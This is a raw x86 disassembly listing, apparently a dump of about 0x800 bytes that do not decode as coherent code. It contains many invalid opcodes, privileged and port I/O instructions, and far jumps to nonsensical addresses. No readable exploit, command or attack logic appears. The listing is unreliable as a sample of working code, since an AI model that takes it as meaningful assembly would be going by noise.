  41fd10:	mov    cl,0x25
  41fd12:	cs test al,0x8f
  41fd15:	in     eax,dx
  41fd16:	mov    esp,0x6e5b9898
  41fd1b:	push   esp
  41fd1c:	sbb    eax,0x89e337f
  41fd21:	mov    WORD PTR [edx+0x4181bbb5],cs
  41fd27:	repz sub ecx,edx
  41fd2a:	xor    ah,BYTE PTR [ebx-0x21ebeb63]
  41fd30:	or     ecx,edi
  41fd32:	sbb    eax,ecx
  41fd34:	(bad)  
  41fd35:	mov    dl,0xaa
  41fd37:	pop    edi
  41fd38:	mov    bl,0xcb
  41fd3a:	lods   al,BYTE PTR ds:[esi]
  41fd3b:	inc    esi
  41fd3c:	xchg   ebx,eax
  41fd3d:	jns    0x41fd7d
  41fd3f:	(bad)  
  41fd40:	retf   
  41fd41:	sti    
  41fd42:	into   
  41fd43:	loop   0x41fd04
  41fd45:	sub    BYTE PTR [ecx],al
  41fd47:	sbb    DWORD PTR [edx],ebx
  41fd49:	sub    ebp,DWORD PTR [esi-0x70]
  41fd4c:	or     eax,0x182c5651
  41fd51:	adc    al,0x62
  41fd53:	fisttp WORD PTR [ecx+0x165925b9]
  41fd59:	test   eax,0xb64eaee
  41fd5e:	popf   
  41fd5f:	cmp    BYTE PTR [edi+0x626fea67],bl
  41fd65:	imul   eax,esi,0xffffffe0
  41fd68:	and    ch,dh
  41fd6a:	rcr    esi,0x51
  41fd6d:	retf   
  41fd6e:	das    
  41fd6f:	xchg   ecx,eax
  41fd70:	dec    eax
  41fd71:	jnp    0x41fd88
  41fd73:	aam    0xec
  41fd75:	push   ss
  41fd76:	push   esi
  41fd77:	(bad)  
  41fd78:	cmp    eax,DWORD PTR [ecx-0x730a861d]
  41fd7e:	dec    edx
  41fd7f:	inc    ebp
  41fd80:	(bad)  
  41fd81:	or     al,0xa6
  41fd83:	or     eax,0x8a29cea6
  41fd88:	(bad)  
  41fd89:	jle    0x41fd8c
  41fd8b:	xchg   ebx,eax
  41fd8c:	mov    fs,WORD PTR [eax+edi*1+0x2cb05613]
  41fd93:	push   esi
  41fd94:	xor    ah,BYTE PTR [ebp+0x37e521f8]
  41fd9a:	xchg   ebp,eax
  41fd9b:	add    ah,BYTE PTR [ebx+0x3f]
  41fd9e:	je     0x41fd31
  41fda0:	je     0x41fdb9
  41fda2:	dec    edx
  41fda3:	fmul   QWORD PTR [esi*2-0x12bebbfc]
  41fdaa:	pop    esi
  41fdab:	add    eax,0xc6c46dc3
  41fdb0:	jl     0x41fddc
  41fdb2:	rol    DWORD PTR [edi+edi*4+0x7bf78c92],0x58
  41fdba:	and    eax,0xa28e1d2e
  41fdbf:	dec    eax
  41fdc0:	scas   eax,DWORD PTR es:[edi]
  41fdc1:	lds    esp,FWORD PTR [edx]
  41fdc3:	cdq    
  41fdc4:	test   eax,0x2bd2c92
  41fdc9:	push   es
  41fdca:	pop    es
  41fdcb:	clc    
  41fdcc:	cmp    DWORD PTR [edi+0xf],ebp
  41fdcf:	pop    ds
  41fdd0:	push   edi
  41fdd1:	scas   al,BYTE PTR es:[edi]
  41fdd2:	shl    BYTE PTR [edx],cl
  41fdd4:	imul   ebp,DWORD PTR cs:[eax+0x35],0x97e10cfa
  41fddc:	ret    
  41fddd:	jmp    0x9af54e90
  41fde2:	mov    bl,0x7d
  41fde4:	jle    0x41fda1
  41fde6:	inc    ebx
  41fde7:	in     al,0xed
  41fde9:	dec    eax
  41fdea:	mov    ecx,0x526e1db5
  41fdef:	rcl    DWORD PTR [edx-0x36a448fb],0x1e
  41fdf6:	xor    al,0x66
  41fdf8:	cmp    eax,0xe40e7ca3
  41fdfd:	adc    ebx,0x192726e2
  41fe03:	call   0x8055:0xe9907fc1
  41fe0a:	dec    eax
  41fe0b:	pop    edi
  41fe0c:	shl    BYTE PTR [ecx],cl
  41fe0e:	loopne 0x41fe48
  41fe10:	in     al,0x6
  41fe12:	or     DWORD PTR [edx],ebx
  41fe14:	fnsave [edi+0x61]
  41fe17:	push   0x2d
  41fe19:	add    DWORD PTR [edx],ebp
  41fe1b:	sub    BYTE PTR [edx],0x6a
  41fe1e:	(bad)  
  41fe1f:	fisubr DWORD PTR [edx+esi*1]
  41fe22:	retf   0xc398
  41fe25:	test   DWORD PTR [edx+esi*1-0x62],esp
  41fe29:	push   ds
  41fe2a:	inc    esi
  41fe2b:	pop    ds
  41fe2c:	xor    al,0x60
  41fe2e:	imul   BYTE PTR [esi*8+0x421c50ed]
  41fe35:	and    DWORD PTR [esi-0x669edf47],ebx
  41fe3b:	push   ds
  41fe3c:	inc    ebx
  41fe3d:	push   esi
  41fe3e:	ins    DWORD PTR es:[edi],dx
  41fe3f:	jno    0x41fe58
  41fe41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe42:	ds clc 
  41fe44:	pop    esi
  41fe45:	stos   BYTE PTR es:[edi],al
  41fe46:	(bad)  
  41fe47:	retf   0x61af
  41fe4a:	imul   ebx,DWORD PTR ds:0x5e8b20ab,0x70
  41fe51:	mov    dl,0xbd
  41fe53:	imul   esp,DWORD PTR [edx],0xfffffff3
  41fe56:	loop   0x41fdfb
  41fe58:	lds    edx,FWORD PTR [ebx]
  41fe5a:	or     ah,cl
  41fe5c:	adc    DWORD PTR [esi-0x530c9a7b],edi
  41fe62:	add    BYTE PTR [edi+0x46],al
  41fe65:	cdq    
  41fe66:	pop    esi
  41fe67:	out    dx,al
  41fe68:	rol    DWORD PTR [esi+0x7206445c],cl
  41fe6e:	clc    
  41fe6f:	pop    ss
  41fe70:	rdmsr  
  41fe72:	xor    BYTE PTR ds:0x6db6be88,dh
  41fe78:	call   0x266cf0b
  41fe7d:	jle    0x41fea6
  41fe7f:	lock xchg ebp,eax
  41fe81:	cmp    cl,BYTE PTR ds:[edi-0xc]
  41fe85:	dec    ebx
  41fe86:	(bad)  
  41fe87:	xchg   edx,eax
  41fe88:	cmp    BYTE PTR [eax],ch
  41fe8a:	xchg   ecx,eax
  41fe8b:	and    DWORD PTR [esi+edx*8],esi
  41fe8e:	iret   
  41fe8f:	dec    esi
  41fe90:	mov    edx,ebx
  41fe92:	test   eax,0x603d495d
  41fe97:	inc    ecx
  41fe98:	inc    ebp
  41fe99:	lods   eax,DWORD PTR ds:[esi]
  41fe9a:	xchg   bl,al
  41fe9c:	scas   al,BYTE PTR es:[edi]
  41fe9d:	cmp    al,0x9c
  41fe9f:	test   DWORD PTR [eax+eiz*4],esp
  41fea2:	ds pop ecx
  41fea4:	mov    ecx,DWORD PTR [ebx+0x3d]
  41fea7:	in     eax,dx
  41fea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fea9:	or     BYTE PTR [ebp+0x55],0x72
  41fead:	scas   al,BYTE PTR es:[edi]
  41feae:	ins    DWORD PTR es:[edi],dx
  41feaf:	les    ebx,FWORD PTR [eax-0x68]
  41feb2:	xor    al,0x2c
  41feb4:	mov    ch,0x53
  41feb6:	loopne 0x41fe7f
  41feb8:	outs   dx,DWORD PTR ds:[esi]
  41feb9:	pop    edi
  41feba:	es jecxz 0x41fe3f
  41febd:	(bad)  
  41febe:	sbb    DWORD PTR [ecx],edi
  41fec0:	mov    esi,0x30352d1f
  41fec5:	call   0xc4172864
  41feca:	stos   DWORD PTR es:[edi],eax
  41fecb:	les    esp,FWORD PTR [esi]
  41fecd:	mov    BYTE PTR [ebx],cl
  41fecf:	ficomp WORD PTR [edx]
  41fed1:	les    edx,FWORD PTR [ecx]
  41fed3:	imul   ebp,DWORD PTR [ecx+0x69],0xffffffe5
  41fed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fed8:	bound  edi,QWORD PTR [ebp+0x3aac9019]
  41fede:	dec    ebp
  41fedf:	call   0x563fffe
  41fee4:	retf   
  41fee5:	mov    bh,0xa8
  41fee7:	fwait
  41fee8:	in     al,dx
  41fee9:	call   0xc6d6607f
  41feee:	mov    cl,0xec
  41fef1:	or     ecx,DWORD PTR [edx-0x37]
  41fef4:	fisub  DWORD PTR [ebx-0x66]
  41fef7:	loope  0x41ff5a
  41fef9:	inc    eax
  41fefa:	rol    ch,0x6f
  41fefd:	mov    ecx,0x9ea4ff0
  41ff02:	sbb    al,0x15
  41ff04:	adc    BYTE PTR [edx],bh
  41ff06:	mov    dl,0x86
  41ff08:	call   eax
  41ff0a:	mov    ebp,DWORD PTR [edi]
  41ff0c:	inc    edx
  41ff0d:	pop    esp
  41ff0e:	aam    0xe6
  41ff10:	sbb    eax,0xa52914f5
  41ff15:	adc    ch,BYTE PTR [edi-0x2bff13e8]
  41ff1b:	add    DWORD PTR [ecx-0x2d8e9eb7],esi
  41ff21:	shl    BYTE PTR [ecx-0x6b],1
  41ff24:	and    al,0xae
  41ff26:	(bad)  
  41ff27:	fadd   DWORD PTR [ebx]
  41ff29:	data16 mov al,0x72
  41ff2c:	shl    BYTE PTR [ebp-0x3c08916c],1
  41ff32:	xchg   DWORD PTR [ebp-0x6d],eax
  41ff35:	adc    eax,esi
  41ff37:	stc    
  41ff38:	loope  0x41ff48
  41ff3a:	jecxz  0x41ff6c
  41ff3c:	mov    bh,0x77
  41ff3e:	out    0xe2,eax
  41ff40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff41:	dec    ebp
  41ff42:	cs jmp 0xeb2fea80
  41ff48:	sbb    al,0xc6
  41ff4a:	mov    eax,0xe20f8645
  41ff4f:	cli    
  41ff50:	aas    
  41ff51:	or     al,0xbd
  41ff53:	rcr    DWORD PTR [ecx-0x96664d0],1
  41ff59:	pop    ss
  41ff5a:	sti    
  41ff5b:	lahf   
  41ff5c:	sub    al,0xf1
  41ff5e:	push   ss
  41ff5f:	dec    edx
  41ff60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff61:	(bad)  
  41ff62:	push   ss
  41ff63:	addr16 push 0xafad0c8f
  41ff69:	sbb    al,BYTE PTR [edx+edi*4]
  41ff6c:	push   esp
  41ff6d:	test   al,0xb1
  41ff6f:	xor    ecx,DWORD PTR [esi]
  41ff71:	pop    ecx
  41ff72:	jge    0x41ff2b
  41ff74:	shrd   eax,edi,cl
  41ff77:	add    BYTE PTR [edx+0x7d1351c1],bl
  41ff7d:	int    0xc
  41ff7f:	sbb    DWORD PTR [ebx+0x7dfeac41],eax
  41ff85:	in     al,0x69
  41ff87:	(bad)  
  41ff88:	(bad)  
  41ff89:	cwde   
  41ff8a:	repz add ah,BYTE PTR [edx-0x1165e9e2]
  41ff91:	pushf  
  41ff92:	dec    esi
  41ff93:	icebp  
  41ff94:	pop    esp
  41ff95:	mov    cl,0xb0
  41ff97:	add    ebp,DWORD PTR [ebp-0x2724c8ce]
  41ff9d:	pop    es
  41ff9e:	mov    ecx,0x9613722a
  41ffa3:	(bad)  
  41ffa4:	mov    eax,ds:0x9939707
  41ffa9:	lods   eax,DWORD PTR ds:[esi]
  41ffaa:	push   0xffffffba
  41ffac:	dec    ebx
  41ffad:	xchg   edi,eax
  41ffae:	or     bh,BYTE PTR [ecx*2-0x6e8e00cc]
  41ffb5:	pop    es
  41ffb6:	lahf   
  41ffb7:	xchg   edx,eax
  41ffb8:	pop    ss
  41ffb9:	mov    bl,0x4b
  41ffbb:	push   esi
  41ffbc:	sbb    al,0xb5
  41ffbe:	push   ebx
  41ffbf:	xor    dl,BYTE PTR ds:0x85c61c4a
  41ffc5:	mov    edx,0xf19abf95
  41ffca:	data16 icebp 
  41ffcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffcd:	mov    eax,ds:0xf2fbddbf
  41ffd2:	or     dh,bh
  41ffd4:	mov    edi,ds
  41ffd6:	ss jbe 0x41ffdb
  41ffd9:	bound  esi,QWORD PTR [eax-0x326e7d89]
  41ffdf:	mov    al,dh
  41ffe1:	ret    
  41ffe2:	pop    eax
  41ffe3:	or     esp,esi
  41ffe5:	inc    ebp
  41ffe6:	xsavec [ecx+ecx*2+0x5755432]
  41ffee:	and    esp,DWORD PTR [ebx+0x8]
  41fff1:	or     ah,BYTE PTR [edx+0x21]
  41fff4:	sub    dl,BYTE PTR [edx+eax*4-0x58]
  41fff8:	imul   esi,edx,0x4c4fb2e8
  41fffe:	xchg   BYTE PTR [edx-0x2be18dcd],ah
  420004:	outs   dx,BYTE PTR ds:[esi]
  420005:	sub    BYTE PTR [edx+0x4460b6e5],bh
  42000b:	push   cs
  42000c:	xchg   edi,eax
  42000d:	aam    0x48
  42000f:	test   ah,ah
  420011:	pop    eax
  420012:	call   0x821a:0xc1ca5c54
  420019:	pop    edi
  42001a:	jge    0x41fff4
  42001c:	sbb    ch,BYTE PTR [eax-0x5254da22]
  420022:	inc    ebx
  420023:	adc    esp,DWORD PTR [ecx+0x7ee91835]
  420029:	sbb    esp,edi
  42002b:	sub    eax,0xb25101a7
  420030:	dec    ecx
  420031:	rcr    BYTE PTR [ecx+0x27d19d12],1
  420037:	scas   al,BYTE PTR es:[edi]
  420038:	inc    esi
  420039:	in     eax,dx
  42003a:	sub    eax,0x1c39286e
  42003f:	jno    0x42007b
  420041:	js     0x42003f
  420043:	and    eax,DWORD PTR [ebp+0x2ba7eefa]
  420049:	je     0x4200aa
  42004b:	das    
  42004c:	xchg   ecx,eax
  42004d:	frndint 
  42004f:	xor    al,0x1
  420051:	sub    edx,DWORD PTR [edi+0x7]
  420054:	fs dec esp
  420056:	dec    ebp
  420057:	in     eax,0x64
  420059:	xchg   ebx,eax
  42005a:	mov    ah,BYTE PTR [edx]
  42005c:	pushf  
  42005d:	out    0x2e,eax
  42005f:	push   DWORD PTR [esi-0x24126d5f]
  420065:	loopne 0x420055
  420067:	outs   dx,BYTE PTR ds:[esi]
  420068:	jae    0x420069
  42006a:	mov    ecx,0xde205f58
  42006f:	xchg   ecx,eax
  420070:	loop   0x420062
  420072:	jle    0x420058
  420074:	add    al,0xba
  420076:	(bad)  
  420077:	cmc    
  420078:	in     eax,dx
  420079:	retf   
  42007a:	ins    DWORD PTR es:[edi],dx
  42007b:	and    ch,BYTE PTR [ebx+edx*2-0x45]
  42007f:	add    dl,BYTE PTR [esi-0x2]
  420082:	aad    0xa0
  420084:	mov    edi,0xccddfd57
  420089:	stos   WORD PTR es:[edi],ax
  42008b:	jmp    0xf71da1cc
  420090:	jnp    0x420027
  420092:	cli    
  420093:	cwde   
  420094:	pop    edi
  420095:	inc    edx
  420096:	(bad)  
  420097:	(bad)  
  420098:	(bad)  
  420099:	dec    ecx
  42009a:	ret    0xa1eb
  42009d:	mov    edi,0xa123bcff
  4200a2:	push   0x1237175e
  4200a7:	pop    ss
  4200a8:	mov    ch,0x11
  4200aa:	test   eax,0xbdf59d9e
  4200af:	xchg   ebp,eax
  4200b0:	sub    ch,dh
  4200b2:	jg     0x4200ea
  4200b4:	enter  0x190c,0x7b
  4200b8:	loop   0x420104
  4200ba:	pop    ss
  4200bb:	jnp    0x42003e
  4200bd:	bound  ebp,QWORD PTR [edx]
  4200bf:	push   esp
  4200c0:	xor    DWORD PTR [ebx+0x73],edx
  4200c3:	mov    dh,0xd8
  4200c5:	retf   0x75c
  4200c8:	cdq    
  4200c9:	dec    ebp
  4200ca:	xor    eax,0x326d0057
  4200cf:	jo     0x420118
  4200d1:	sbb    dh,BYTE PTR [edi*4+0x74e69332]
  4200d8:	push   ds
  4200d9:	test   BYTE PTR [eax-0x440bfff],0x3
  4200e0:	(bad)  [ebx-0x5dc56828]
  4200e6:	fldln2 
  4200e8:	xchg   ebx,eax
  4200e9:	adc    eax,0xefb8471d
  4200ee:	ins    DWORD PTR es:[edi],dx
  4200ef:	pushf  
  4200f0:	test   DWORD PTR [eax-0xddac760],edx
  4200f6:	pop    ebx
  4200f7:	mov    al,0xba
  4200f9:	adc    bl,BYTE PTR fs:[eax]
  4200fc:	lock mov eax,cs:0x7bd5bb29
  420103:	mov    edx,0x1e537478
  420108:	xor    al,0x89
  42010a:	jge    0x42016c
  42010c:	call   0x35e0:0xd7436ac5
  420113:	push   ebp
  420114:	xchg   ebx,eax
  420115:	out    0xf,al
  420117:	sub    BYTE PTR [ebx-0x31c75fb8],ch
  42011d:	pop    ebx
  42011e:	push   edx
  42011f:	pop    edi
  420121:	arpl   WORD PTR [edx+0x55],bp
  420124:	lea    ebx,[ebx+0x5ceac866]
  42012a:	(bad)  
  42012c:	adc    edi,DWORD PTR [edx+0x3b]
  42012f:	hlt    
  420130:	dec    esi
  420131:	ins    BYTE PTR es:[edi],dx
  420132:	mov    edx,0x647abd69
  420137:	jno    0x42016e
  420139:	enterw 0x8870,0xed
  42013e:	xchg   ebx,eax
  42013f:	jl     0x420150
  420141:	stos   BYTE PTR es:[edi],al
  420142:	xchg   BYTE PTR [edi+0x68aae52c],bl
  420148:	adc    bh,BYTE PTR ds:0x8d077f10
  42014e:	(bad)  
  42014f:	ficomp WORD PTR [eax+0x6f]
  420152:	mov    ds:0xf5f6722a,al
  420157:	repz mov al,ds:0x910ad67a
  42015d:	push   ebp
  42015e:	cmp    edi,DWORD PTR [ecx+edx*2-0x3c]
  420162:	xlat   BYTE PTR ds:[ebx]
  420163:	retf   0x6f9e
  420166:	popf   
  420167:	dec    esi
  420168:	and    DWORD PTR [ebx+0x7e],ebp
  42016b:	xor    ebx,DWORD PTR [esi-0x3c0ad182]
  420171:	fsub   QWORD PTR [eax+0x1]
  420174:	into   
  420175:	sbb    eax,0x30231431
  42017a:	pop    ebx
  42017b:	sbb    BYTE PTR [edx],0x29
  42017e:	mov    edi,0xf2de8859
  420183:	ret    0x1331
  420186:	retf   0x52c1
  420189:	retf   0x3a8e
  42018c:	(bad)  
  42018d:	jmp    0xc2b6:0x5ac0dbc4
  420194:	enter  0x1777,0xac
  420198:	or     al,0x8
  42019a:	int    0x8f
  42019c:	arpl   WORD PTR [esi+0x41],si
  42019f:	push   ds
  4201a0:	jae    0x4201eb
  4201a2:	retf   
  4201a3:	enter  0x20f7,0x83
  4201a7:	mov    edx,0x13d14eb0
  4201ac:	data16 repnz (bad) 
  4201af:	iret   
  4201b0:	pusha  
  4201b1:	xchg   DWORD PTR [ebx-0x7f],edx
  4201b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201b5:	scas   al,BYTE PTR es:[edi]
  4201b6:	xor    DWORD PTR [ecx-0x28],ebp
  4201b9:	arpl   WORD PTR [ebx+ecx*1],si
  4201bc:	mov    ah,0x77
  4201be:	std    
  4201bf:	push   ebp
  4201c0:	mov    BYTE PTR [ebp+0x7702f1eb],0xed
  4201c7:	or     eax,edx
  4201c9:	inc    esp
  4201ca:	pop    ebx
  4201cb:	sahf   
  4201cc:	or     eax,0x53cea36e
  4201d1:	bound  ecx,QWORD PTR [eax-0x1d]
  4201d4:	cmc    
  4201d5:	sub    BYTE PTR [edi+eax*2],ah
  4201d8:	push   eax
  4201d9:	push   ebx
  4201da:	inc    esi
  4201db:	jbe    0x420229
  4201dd:	div    BYTE PTR [edi+esi*1-0x47f0590d]
  4201e4:	jae    0x42020a
  4201e6:	mov    cl,0x87
  4201e8:	sbb    ebp,DWORD PTR [ebp-0x18]
  4201eb:	push   ecx
  4201ec:	fincstp 
  4201ee:	scas   al,BYTE PTR es:[edi]
  4201ef:	adc    eax,0x6384146d
  4201f4:	neg    BYTE PTR [ecx+0x60cd87cd]
  4201fa:	lods   al,BYTE PTR ds:[esi]
  4201fb:	push   ebp
  4201fc:	and    edx,DWORD PTR [esi]
  4201fe:	push   ebp
  4201ff:	mov    ds:0x29903ef8,eax
  420204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420205:	test   eax,0x665d598b
  42020a:	mov    ah,0x21
  42020c:	nop
  42020d:	add    al,0xc4
  42020f:	in     eax,0x92
  420211:	cmc    
  420212:	loop   0x420293
  420214:	mov    edx,0x3ab6f893
  420219:	mov    eax,ds:0x55cb7a7e
  42021e:	and    bh,BYTE PTR [ecx]
  420220:	mov    ds:0x8dc40fc0,al
  420225:	inc    edx
  420226:	xchg   edx,eax
  420227:	cmp    ebx,DWORD PTR [ebp+0x74]
  42022a:	dec    ebx
  42022b:	in     eax,0x1b
  42022d:	test   eax,0x34479a7
  420232:	pop    ecx
  420233:	dec    esi
  420234:	(bad)  
  420235:	in     eax,dx
  420236:	cmp    ecx,ecx
  420238:	pop    esi
  420239:	pop    ebp
  42023a:	adc    al,0xe1
  42023c:	retf   0x961c
  42023f:	and    al,0xe8
  420241:	pop    es
  420242:	mov    fs,WORD PTR [edx+0x1381a9fc]
  420248:	lahf   
  420249:	fld    QWORD PTR [ebx]
  42024b:	adc    eax,0xa0f3a62e
  420250:	fist   WORD PTR [esi-0x72d1e8b6]
  420256:	or     eax,0x59374789
  42025b:	sbb    dl,BYTE PTR [edi+0x3412a1b0]
  420261:	outs   dx,BYTE PTR ds:[esi]
  420262:	push   es
  420263:	mov    al,0x8
  420265:	sar    DWORD PTR [esi-0x6],1
  420268:	cmp    DWORD PTR [edx-0x6b9ecfe5],ecx
  42026e:	je     0x420209
  420270:	(bad)  
  420272:	and    al,0x9c
  420274:	ins    BYTE PTR es:[edi],dx
  420275:	ins    BYTE PTR es:[edi],dx
  420276:	sbb    eax,0xe966fd6c
  42027b:	fld    QWORD PTR [esi+ecx*4+0x75]
  42027f:	fisttp QWORD PTR [esi+0x51403a43]
  420285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420286:	jb     0x42027f
  420288:	push   es
  420289:	out    dx,al
  42028a:	fs leave 
  42028c:	jecxz  0x4202b0
  42028e:	cld    
  42028f:	jne    0x420284
  420291:	dec    edi
  420292:	or     ah,dl
  420294:	int3   
  420295:	mov    DWORD PTR [edi+eiz*4],eax
  420298:	fmul   DWORD PTR [ebx]
  42029a:	data16 sti 
  42029c:	mov    edx,0xa6a06f8f
  4202a1:	mov    esi,0xae1784f2
  4202a6:	add    ebp,esp
  4202a8:	int    0xbb
  4202aa:	mov    DWORD PTR [eax],edx
  4202ac:	(bad)  
  4202ad:	cmc    
  4202ae:	mov    WORD PTR [ebx],ss
  4202b0:	fcomp  DWORD PTR [ebx+0x6f217509]
  4202b6:	in     eax,dx
  4202b7:	xlat   BYTE PTR ds:[ebx]
  4202b8:	inc    eax
  4202b9:	inc    ebx
  4202ba:	jecxz  0x4202c8
  4202bc:	mov    cl,0xa2
  4202be:	mov    al,0x42
  4202c0:	aas    
  4202c1:	js     0x420338
  4202c3:	das    
  4202c4:	add    al,0xec
  4202c6:	sbb    al,0x6a
  4202c8:	xchg   ecx,eax
  4202c9:	xor    DWORD PTR [edx+0x15715f48],0xffffffa2
  4202d0:	and    bh,BYTE PTR [eax]
  4202d2:	fmul   st(6),st
  4202d4:	shr    ah,0x41
  4202d7:	out    0x7b,al
  4202d9:	and    al,0xc9
  4202db:	xchg   esi,eax
  4202dc:	cmp    ah,BYTE PTR [ecx+0x79]
  4202df:	xchg   ebx,eax
  4202e0:	fsubr  QWORD PTR [ebx-0x16babc4a]
  4202e6:	(bad)  [ebx+0x69]
  4202e9:	mov    ebx,ss
  4202eb:	mov    ecx,0xb7976a45
  4202f0:	or     bl,ah
  4202f2:	xchg   dh,al
  4202f4:	out    0x71,eax
  4202f6:	cs call 0xf0fa90f7
  4202fc:	sbb    al,0x4b
  4202fe:	repz cs jp 0x4202f3
  420302:	mov    dh,0x2b
  420304:	mov    cl,0x60
  420306:	sub    BYTE PTR [ecx],dh
  420308:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420309:	ja     0x42038a
  42030b:	mov    eax,0xd6bc3f0d
  420310:	xchg   esp,eax
  420311:	call   0x56d511c5
  420316:	mov    ecx,0x72b9d8b9
  42031b:	and    BYTE PTR [ebx],bh
  42031d:	pusha  
  42031e:	fcomp  DWORD PTR [esi+0x42]
  420321:	mov    esi,0xc7e9b7b3
  420326:	sub    eax,0x9bf9cece
  42032b:	jle    0x420396
  42032d:	sub    eax,0x703713cf
  420332:	jne    0x42031f
  420334:	pop    es
  420335:	cmp    BYTE PTR [eax+eax*1],bh
  420338:	test   dl,al
  42033a:	push   edx
  42033b:	xor    eax,DWORD PTR [eax-0x41]
  42033e:	dec    edi
  42033f:	pop    eax
  420340:	out    dx,eax
  420341:	lods   eax,DWORD PTR ds:[esi]
  420342:	cmp    DWORD PTR [edx],ebx
  420344:	pop    esp
  420345:	vminss xmm5,xmm3,DWORD PTR [eax+eax*1]
  42034a:	and    al,0x75
  42034c:	sar    ah,0x94
  42034f:	xlat   BYTE PTR ds:[ebx]
  420350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420351:	dec    ebp
  420352:	sbb    dh,BYTE PTR [ebx-0x7df0db7b]
  420358:	fdiv   DWORD PTR [eax+ebx*8-0x62]
  42035c:	xor    BYTE PTR [eax+0x4f],0xb1
  420360:	inc    ebx
  420361:	sbb    esi,esp
  420363:	push   edx
  420364:	inc    edi
  420365:	in     eax,0xed
  420367:	xor    eax,0x9600c948
  42036c:	arpl   dx,si
  42036e:	bswap  esi
  420370:	stos   DWORD PTR es:[edi],eax
  420371:	pop    ebx
  420372:	stos   BYTE PTR es:[edi],al
  420373:	mov    ecx,0x1982039
  420378:	add    al,0xf9
  42037a:	leave  
  42037b:	lds    esi,FWORD PTR gs:[edi+0x72]
  42037f:	push   ds
  420380:	xor    DWORD PTR [ebx],esp
  420382:	pop    edi
  420383:	jmp    0x42036b
  420385:	dec    esi
  420386:	dec    eax
  420387:	loop   0x4203ed
  420389:	pop    ss
  42038a:	mov    ebp,0x8422f3fc
  42038f:	cdq    
  420390:	in     al,0x4d
  420392:	add    edx,DWORD PTR [edx]
  420394:	shl    BYTE PTR ds:0x5ce9b55f,0xcd
  42039b:	pusha  
  42039c:	mov    ch,0xf
  42039e:	popa   
  42039f:	fs out dx,eax
  4203a1:	sar    esi,cl
  4203a3:	rcl    DWORD PTR [edi-0xa9d09dc],cl
  4203a9:	adc    DWORD PTR [esi+ebx*1+0x37],esp
  4203ad:	mov    DWORD PTR [edx+eiz*1+0xe],0xacca7cc7
  4203b5:	dec    esi
  4203b6:	pop    ds
  4203b7:	(bad)  
  4203b8:	mov    ebp,0xbe76f290
  4203bd:	cmp    al,0x13
  4203bf:	inc    ebp
  4203c0:	pop    edx
  4203c1:	jp     0x420402
  4203c3:	sbb    edi,edx
  4203c5:	mov    cl,0xd3
  4203c7:	adc    DWORD PTR [esi],ecx
  4203c9:	pop    eax
  4203ca:	sti    
  4203cb:	dec    edx
  4203cc:	dec    eax
  4203cd:	mov    dh,0x8f
  4203cf:	fbld   TBYTE PTR [ecx]
  4203d1:	xchg   cl,bl
  4203d3:	aas    
  4203d4:	int3   
  4203d5:	dec    al
  4203d7:	ret    
  4203d8:	inc    ecx
  4203d9:	push   cs
  4203da:	jge    0x4203b5
  4203dc:	les    edi,FWORD PTR ss:[edi]
  4203df:	cmp    bh,ah
  4203e1:	inc    ebp
  4203e2:	xchg   edx,eax
  4203e3:	push   edi
  4203e4:	retf   
  4203e5:	cli    
  4203e6:	pushf  
  4203e7:	cwde   
  4203e8:	fmul   st,st(1)
  4203ea:	jb     0x42041a
  4203ec:	mov    dh,0x88
  4203ee:	nop
  4203ef:	sbb    BYTE PTR [eax+0x569121e3],ch
  4203f5:	cmp    ebx,esp
  4203f7:	rcl    DWORD PTR [ebp+0xf787252],0x84
  4203fe:	cmp    BYTE PTR [ebp+0x25],bh
  420401:	adc    al,ah
  420403:	xor    dh,BYTE PTR ds:0xd28143c7
  420409:	out    dx,eax
  42040a:	dec    eax
  42040b:	rcr    DWORD PTR [eax-0x51b25f15],cl
  420411:	and    DWORD PTR [esi],0xee7bba89
  420417:	ror    BYTE PTR [ebp-0x36],cl
  42041a:	inc    esp
  42041b:	mov    al,0x4d
  42041d:	rcl    dl,cl
  42041f:	jg     0x4203a4
  420421:	inc    BYTE PTR [edi-0xc]
  420424:	test   BYTE PTR [ecx+0x5df0a5ce],ah
  42042a:	mov    eax,0x728fda2c
  42042f:	or     DWORD PTR [edi+edx*8],edi
  420432:	imul   esp,ebp,0xa8e8997b
  420438:	into   
  420439:	les    eax,FWORD PTR [ebx]
  42043b:	hlt    
  42043c:	loop   0x420454
  42043e:	push   ss
  42043f:	repnz out 0x7,eax
  420442:	aam    0xf1
  420444:	call   0x13c18bb4
  420449:	adc    edi,0x74
  42044c:	fstp   DWORD PTR [ecx]
  42044e:	retf   0x983c
  420451:	aad    0xe1
  420453:	imul   ebx,DWORD PTR [ebp+0x6d],0x6a8f9008
  42045a:	sbb    eax,0x50aed694
  42045f:	cmp    al,0x31
  420461:	or     eax,0xdffbe5a7
  420466:	pop    edx
  420467:	call   0xa4db7f95
  42046c:	cdq    
  42046d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42046e:	jle    0x42043a
  420470:	test   DWORD PTR [esi],edx
  420472:	aaa    
  420473:	xchg   ebx,eax
  420474:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420475:	inc    esp
  420476:	dec    edx
  420477:	add    al,0xb8
  420479:	daa    
  42047a:	and    DWORD PTR [esi],edi
  42047c:	pop    edi
  42047d:	cmp    DWORD PTR [edi-0x48],eax
  420480:	pop    esp
  420481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420482:	rcl    DWORD PTR [eax+esi*1+0x7a],0x98
  420487:	sbb    eax,0xaedd9da7
  42048c:	sahf   
  42048d:	xchg   esi,eax
  42048e:	sbb    al,0x90
  420490:	dec    ebx
  420491:	sti    
  420492:	mov    ch,0x1a
  420494:	mov    esi,0xdafa057c
  420499:	cld    
  42049a:	dec    ebx
  42049b:	and    DWORD PTR [edi+0x22eb4e6d],ebx
  4204a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204a2:	jmp    0x420512
  4204a4:	jo     0x42045e
